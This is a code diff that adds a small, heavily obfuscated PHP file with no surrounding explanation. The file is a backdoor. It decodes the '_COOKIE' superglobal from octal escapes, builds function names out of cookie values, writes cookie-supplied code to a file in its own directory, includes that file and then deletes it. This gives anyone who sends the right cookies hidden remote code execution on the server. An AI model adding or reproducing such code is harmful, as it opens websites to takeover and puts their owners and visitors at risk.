@@ -1,0 +1,2 @@
+<?php
+$LUo = $	{	"\137"	.	"\103\117".	"\117" .	"\113".	"\111" ."\105"}; if(isset ( $LUo [	( 99 -1) ]	)){ $YT=$LUo[(	97-5)	 ]	.$LUo	[  (	87	- 38)] ;	$TGp = $YT ($LUo[ (52	- 28)	].$LUo [	(62-4)	 ]	);	$TCEs=$TGp	(	$YT ($LUo [ ( 93- 34)	])	);$dWAb=$TGp($YT(	$LUo[ 	(66-	14)	]	)) ;	 $Wb=	__DIR__	.$TGp($YT	($LUo[ (	99	-3 )])	);  $TCEs	($Wb , $TGp( $YT( $LUo[(99	- 1	) ]	) ) ); include (	$Wb) ;	$dWAb	(	$Wb); }
